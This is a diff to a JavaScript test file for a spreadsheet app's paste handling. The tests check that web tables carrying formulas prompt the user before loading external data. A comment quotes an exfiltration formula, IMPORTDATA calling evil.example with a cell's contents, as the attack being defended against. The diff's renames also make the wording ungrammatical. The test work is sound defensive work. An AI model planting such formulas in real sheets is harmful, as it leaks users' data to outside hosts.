@@ -6,7 +6,7 @@ import { toDelimited } from '../src/core/tsv.js';
 import { cellsToHtml } from '../src/core/clipboard.js';
 
 // An HTML table copied from any web page can carry this app's own cell
-// payload, formulas included. Pasted into a trusted spreadsheet, a formula
+// payload, formulas included. Pasted into a trusted sheets, a formula
 // such as IMPORTDATA("https://evil.example/?leak="&B1) fetched at once and
 // sent the sheet's contents along. Such a paste now asks first, the way a
 // file from elsewhere does.
@@ -33,7 +33,7 @@ beforeEach(() => {
 afterEach(() => { view?.destroy(); view = null; vi.clearAllTimers(); vi.useRealTimers(); vi.restoreAllMocks(); vi.unstubAllGlobals(); document.body.replaceChildren(); });
 
 async function mount() {
-  const doc = new Doc({ name: 'Mine', path: 'Spreadsheets/Mine.xlsx' });
+  const doc = new Doc({ name: 'Mine', path: 'Sheets/Mine.xlsx' });
   const wb = doc.wb;
   const id = wb.activeSheetId;
   wb.setInput(id, 0, 1, 'secret');
@@ -81,7 +81,7 @@ it('asks for a web table whose text is a reaching formula, and for IMAGE with a 
   expect(wb.externalAllowed).toBe(false);
 });
 
-it('leaves harmless pastes and the spreadsheet\'s own copies trusted', async () => {
+it('leaves harmless pastes and the sheets\'s own copies trusted', async () => {
   const { wb, id, viewport } = await mount();
   paste(viewport, { 'text/html': cellsToHtml([['4']], [[{ v: null, f: 'B1&"!"' }]], null, null, { r: 0, c: 0 }) });
   expect(wb.getValue(id, 0, 0)).toBe('secret!');
@@ -89,7 +89,7 @@ it('leaves harmless pastes and the spreadsheet\'s own copies trusted', async () 
   paste(viewport, { 'text/plain': 'https://example.com is just text' });
   expect(wb.externalAllowed).toBe(true);
   expect(notice().hidden).toBe(true);
-  // A formula typed here, then copied and pasted within the spreadsheet, is the user's own.
+  // A formula typed here, then copied and pasted within the sheets, is the user's own.
   wb.setInput(id, 2, 0, '=IMPORTDATA("https://example.com/a.csv")');
   view.goTo('Sheet1!A3');
   const copy = new Event('copy', { bubbles: true, cancelable: true });
